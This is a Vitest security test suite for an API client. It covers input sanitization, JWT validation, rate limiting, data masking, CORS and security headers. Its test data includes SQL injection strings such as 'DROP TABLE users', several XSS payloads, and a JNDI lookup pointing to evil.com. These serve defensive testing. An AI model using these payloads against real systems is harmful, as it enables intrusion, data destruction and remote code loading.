/**
 * API Security Tests
 * Comprehensive security testing for API endpoints and data protection
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { apiClient } from '@/api/apiClient'
import { securityService } from '@/services/securityService'
import { auditService } from '@/services/auditService'
import { testDataFactories } from '@/test/utils'

// Mock dependencies
vi.mock('@/api/apiClient')
vi.mock('@/services/securityService')
vi.mock('@/services/auditService')

// Mock fetch for security testing
global.fetch = vi.fn()

describe('API Security Tests', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    
    // Mock security service
    securityService.sanitizeInput = vi.fn(input => input)
    securityService.validateInput = vi.fn().mockReturnValue({ isValid: true, errors: [] })
    securityService.detectSQLInjection = vi.fn().mockReturnValue(false)
    securityService.detectXSS = vi.fn().mockReturnValue(false)
    securityService.encryptSensitiveData = vi.fn(data => `encrypted_${data}`)
    securityService.decryptSensitiveData = vi.fn(data => data.replace('encrypted_', ''))
    
    // Mock audit service
    auditService.logSecurity = vi.fn()
    auditService.logAccess = vi.fn()
  })

  afterEach(() => {
    vi.clearAllTimers()
  })

  describe('Input Sanitization', () => {
    it('should sanitize all API inputs', async () => {
      const maliciousData = {
        name: '<script>alert("XSS")</script>',
        description: 'DROP TABLE campaigns; --',
        email: 'test@example.com<script>',
        content: '${jndi:ldap://evil.com/a}'
      }

      const mockResponse = {
        ok: true,
        json: () => Promise.resolve({ success: true, data: { id: 1 } })
      }

      fetch.mockResolvedValueOnce(mockResponse)
      securityService.sanitizeInput = vi.fn().mockImplementation(input => 
        input.replace(/<script.*?>.*?<\/script>/gi, '')
              .replace(/DROP TABLE.*?;/gi, '')
              .replace(/\$\{.*?\}/gi, '')
      )

      await apiClient.post('/campaigns', maliciousData)

      // Should sanitize all inputs
      expect(securityService.sanitizeInput).toHaveBeenCalledWith(maliciousData.name)
      expect(securityService.sanitizeInput).toHaveBeenCalledWith(maliciousData.description)
      expect(securityService.sanitizeInput).toHaveBeenCalledWith(maliciousData.email)
      expect(securityService.sanitizeInput).toHaveBeenCalledWith(maliciousData.content)
    })

    it('should detect and block SQL injection attempts', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'/*",
        "1; DELETE FROM campaigns WHERE 1=1; --",
        "UNION SELECT * FROM users"
      ]

      for (const payload of sqlInjectionPayloads) {
        securityService.detectSQLInjection = vi.fn().mockReturnValue(true)

        const maliciousData = { name: payload }

        try {
          await apiClient.post('/campaigns', maliciousData)
        } catch (error) {
          expect(error.message).toContain('Security violation detected')
        }

        expect(securityService.detectSQLInjection).toHaveBeenCalledWith(payload)
        expect(auditService.logSecurity).toHaveBeenCalledWith(
          'sql_injection_blocked',
          expect.objectContaining({
            payload,
            endpoint: '/campaigns',
            method: 'POST'
          })
        )
      }
    })

    it('should detect and block XSS attempts', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert("XSS")',
        '<svg onload="alert(1)">',
        '<iframe src="javascript:alert(1)"></iframe>'
      ]

      for (const payload of xssPayloads) {
        securityService.detectXSS = vi.fn().mockReturnValue(true)

        const maliciousData = { content: payload }

        try {
          await apiClient.post('/content', maliciousData)
        } catch (error) {
          expect(error.message).toContain('Security violation detected')
        }

        expect(securityService.detectXSS).toHaveBeenCalledWith(payload)
        expect(auditService.logSecurity).toHaveBeenCalledWith(
          'xss_attempt_blocked',
          expect.objectContaining({
            payload,
            endpoint: '/content',
            method: 'POST'
          })
        )
      }
    })

    it('should validate file upload security', async () => {
      const maliciousFile = new File(['<script>alert("XSS")</script>'], 'malicious.html', {
        type: 'text/html'
      })

      const formData = new FormData()
      formData.append('file', maliciousFile)

      securityService.validateFileUpload = vi.fn().mockReturnValue({
        isValid: false,
        reason: 'Potentially malicious file type'
      })

      try {
        await apiClient.post('/upload', formData)
      } catch (error) {
        expect(error.message).toContain('File upload rejected')
      }

      expect(securityService.validateFileUpload).toHaveBeenCalledWith(maliciousFile)
      expect(auditService.logSecurity).toHaveBeenCalledWith(
        'malicious_file_upload_blocked',
        expect.objectContaining({
          filename: 'malicious.html',
          fileType: 'text/html',
          reason: 'Potentially malicious file type'
        })
      )
    })
  })

  describe('Authentication Security', () => {
    it('should validate JWT tokens on all protected endpoints', async () => {
      const invalidToken = 'invalid.jwt.token'
      
      securityService.validateJWT = vi.fn().mockReturnValue({
        valid: false,
        reason: 'Token expired'
      })

      const mockResponse = {
        ok: false,
        status: 401,
        json: () => Promise.resolve({ error: 'Unauthorized' })
      }

      fetch.mockResolvedValueOnce(mockResponse)

      try {
        await apiClient.get('/campaigns', {
          headers: { Authorization: `Bearer ${invalidToken}` }
        })
      } catch (error) {
        expect(error.status).toBe(401)
      }

      expect(securityService.validateJWT).toHaveBeenCalledWith(invalidToken)
      expect(auditService.logSecurity).toHaveBeenCalledWith(
        'invalid_token_access_attempt',
        expect.objectContaining({
          token: invalidToken,
          endpoint: '/campaigns',
          reason: 'Token expired'
        })
      )
    })

    it('should implement proper authorization checks', async () => {
      const userToken = 'user.jwt.token'
      const adminEndpoint = '/admin/users'

      securityService.validateJWT = vi.fn().mockReturnValue({
        valid: true,
        payload: { userId: 1, role: 'user' }
      })

      securityService.checkPermissions = vi.fn().mockReturnValue({
        hasPermission: false,
        requiredRole: 'admin',
        userRole: 'user'
      })

      const mockResponse = {
        ok: false,
        status: 403,
        json: () => Promise.resolve({ error: 'Forbidden' })
      }

      fetch.mockResolvedValueOnce(mockResponse)

      try {
        await apiClient.get(adminEndpoint, {
          headers: { Authorization: `Bearer ${userToken}` }
        })
      } catch (error) {
        expect(error.status).toBe(403)
      }

      expect(securityService.checkPermissions).toHaveBeenCalledWith('user', adminEndpoint)
      expect(auditService.logSecurity).toHaveBeenCalledWith(
        'unauthorized_access_attempt',
        expect.objectContaining({
          userId: 1,
          endpoint: adminEndpoint,
          requiredRole: 'admin',
          userRole: 'user'
        })
      )
    })

    it('should detect token tampering attempts', async () => {
      const tamperedToken = 'tampered.jwt.token'

      securityService.validateJWT = vi.fn().mockReturnValue({
        valid: false,
        reason: 'Invalid signature'
      })

      const mockResponse = {
        ok: false,
        status: 401,
        json: () => Promise.resolve({ error: 'Token invalid' })
      }

      fetch.mockResolvedValueOnce(mockResponse)

      try {
        await apiClient.get('/campaigns', {
          headers: { Authorization: `Bearer ${tamperedToken}` }
        })
      } catch (error) {
        expect(error.status).toBe(401)
      }

      expect(auditService.logSecurity).toHaveBeenCalledWith(
        'token_tampering_detected',
        expect.objectContaining({
          token: tamperedToken,
          reason: 'Invalid signature'
        })
      )
    })
  })

  describe('Rate Limiting', () => {
    it('should implement rate limiting on sensitive endpoints', async () => {
      const sensitiveEndpoints = ['/auth/login', '/auth/register', '/auth/reset-password']

      for (const endpoint of sensitiveEndpoints) {
        securityService.checkRateLimit = vi.fn().mockReturnValue({
          allowed: false,
          remaining: 0,
          resetTime: Date.now() + 300000
        })

        const mockResponse = {
          ok: false,
          status: 429,
          json: () => Promise.resolve({ error: 'Too Many Requests' })
        }

        fetch.mockResolvedValueOnce(mockResponse)

        try {
          await apiClient.post(endpoint, { email: 'test@example.com' })
        } catch (error) {
          expect(error.status).toBe(429)
        }

        expect(securityService.checkRateLimit).toHaveBeenCalledWith(endpoint)
        expect(auditService.logSecurity).toHaveBeenCalledWith(
          'rate_limit_exceeded',
          expect.objectContaining({
            endpoint,
            ip: expect.any(String)
          })
        )
      }
    })

    it('should implement progressive rate limiting', async () => {
      const endpoint = '/auth/login'
      let attemptCount = 0

      securityService.checkRateLimit = vi.fn().mockImplementation(() => {
        attemptCount++
        const baseLimit = 5
        const currentLimit = Math.max(1, baseLimit - attemptCount)
        
        return {
          allowed: attemptCount <= baseLimit,
          remaining: Math.max(0, currentLimit),
          resetTime: Date.now() + (attemptCount * 60000) // Progressive delay
        }
      })

      // Make multiple requests
      for (let i = 1; i <= 7; i++) {
        const isAllowed = i <= 5
        const mockResponse = {
          ok: isAllowed,
          status: isAllowed ? 200 : 429,
          json: () => Promise.resolve(
            isAllowed 
              ? { success: true } 
              : { error: 'Too Many Requests' }
          )
        }

        fetch.mockResolvedValueOnce(mockResponse)

        try {
          await apiClient.post(endpoint, { email: 'test@example.com' })
          if (!isAllowed) {
            throw new Error('Should have been rate limited')
          }
        } catch (error) {
          if (isAllowed) {
            throw error
          }
          expect(error.status).toBe(429)
        }
      }

      expect(securityService.checkRateLimit).toHaveBeenCalledTimes(7)
    })
  })

  describe('Data Protection', () => {
    it('should encrypt sensitive data in transit', async () => {
      const sensitiveData = {
        password: 'userPassword123',
        ssn: '123-45-6789',
        creditCard: '4111-1111-1111-1111'
      }

      const mockResponse = {
        ok: true,
        json: () => Promise.resolve({ success: true })
      }

      fetch.mockResolvedValueOnce(mockResponse)

      await apiClient.post('/user/profile', sensitiveData)

      // Should encrypt sensitive fields
      expect(securityService.encryptSensitiveData).toHaveBeenCalledWith(sensitiveData.password)
      expect(securityService.encryptSensitiveData).toHaveBeenCalledWith(sensitiveData.ssn)
      expect(securityService.encryptSensitiveData).toHaveBeenCalledWith(sensitiveData.creditCard)
    })

    it('should mask sensitive data in logs', async () => {
      const userData = {
        email: 'user@example.com',
        password: 'secretPassword123',
        phone: '+1234567890'
      }

      securityService.maskSensitiveData = vi.fn().mockReturnValue({
        email: 'u***@example.com',
        password: '***',
        phone: '+123***7890'
      })

      const mockResponse = {
        ok: true,
        json: () => Promise.resolve({ success: true })
      }

      fetch.mockResolvedValueOnce(mockResponse)

      await apiClient.post('/auth/register', userData)

      expect(securityService.maskSensitiveData).toHaveBeenCalledWith(userData)
      expect(auditService.logAccess).toHaveBeenCalledWith(
        'user_registration_attempt',
        expect.objectContaining({
          data: {
            email: 'u***@example.com',
            password: '***',
            phone: '+123***7890'
          }
        })
      )
    })

    it('should validate data integrity', async () => {
      const campaignData = testDataFactories.campaign()
      
      securityService.calculateChecksum = vi.fn().mockReturnValue('checksum123')
      securityService.validateChecksum = vi.fn().mockReturnValue(true)

      const mockResponse = {
        ok: true,
        json: () => Promise.resolve({ 
          success: true, 
          data: { ...campaignData, checksum: 'checksum123' }
        })
      }

      fetch.mockResolvedValueOnce(mockResponse)

      const result = await apiClient.post('/campaigns', campaignData)

      expect(securityService.calculateChecksum).toHaveBeenCalledWith(campaignData)
      expect(securityService.validateChecksum).toHaveBeenCalledWith(
        result.data,
        'checksum123'
      )
    })
  })

  describe('CORS Security', () => {
    it('should validate CORS headers', async () => {
      const allowedOrigins = ['https://pikar-ai.com', 'https://app.pikar-ai.com']
      const suspiciousOrigin = 'https://malicious-site.com'

      securityService.validateCORSOrigin = vi.fn().mockReturnValue(false)

      const mockResponse = {
        ok: false,
        status: 403,
        json: () => Promise.resolve({ error: 'CORS policy violation' })
      }

      fetch.mockResolvedValueOnce(mockResponse)

      try {
        await apiClient.get('/campaigns', {
          headers: { Origin: suspiciousOrigin }
        })
      } catch (error) {
        expect(error.status).toBe(403)
      }

      expect(securityService.validateCORSOrigin).toHaveBeenCalledWith(suspiciousOrigin)
      expect(auditService.logSecurity).toHaveBeenCalledWith(
        'cors_violation',
        expect.objectContaining({
          origin: suspiciousOrigin,
          allowedOrigins
        })
      )
    })
  })

  describe('API Versioning Security', () => {
    it('should validate API version compatibility', async () => {
      const deprecatedVersion = 'v1'
      const currentVersion = 'v2'

      securityService.validateAPIVersion = vi.fn().mockReturnValue({
        valid: false,
        deprecated: true,
        supportedVersions: ['v2', 'v3']
      })

      const mockResponse = {
        ok: false,
        status: 400,
        json: () => Promise.resolve({ 
          error: 'API version deprecated',
          supportedVersions: ['v2', 'v3']
        })
      }

      fetch.mockResolvedValueOnce(mockResponse)

      try {
        await apiClient.get(`/${deprecatedVersion}/campaigns`)
      } catch (error) {
        expect(error.status).toBe(400)
      }

      expect(securityService.validateAPIVersion).toHaveBeenCalledWith(deprecatedVersion)
      expect(auditService.logSecurity).toHaveBeenCalledWith(
        'deprecated_api_version_used',
        expect.objectContaining({
          version: deprecatedVersion,
          supportedVersions: ['v2', 'v3']
        })
      )
    })
  })

  describe('Security Headers Validation', () => {
    it('should validate required security headers', async () => {
      const requiredHeaders = [
        'X-Content-Type-Options',
        'X-Frame-Options',
        'X-XSS-Protection',
        'Strict-Transport-Security',
        'Content-Security-Policy'
      ]

      securityService.validateSecurityHeaders = vi.fn().mockReturnValue({
        valid: true,
        missingHeaders: [],
        presentHeaders: requiredHeaders
      })

      const mockResponse = {
        ok: true,
        headers: new Map(requiredHeaders.map(header => [header, 'secure-value'])),
        json: () => Promise.resolve({ success: true })
      }

      fetch.mockResolvedValueOnce(mockResponse)

      await apiClient.get('/campaigns')

      expect(securityService.validateSecurityHeaders).toHaveBeenCalled()
    })
  })
})
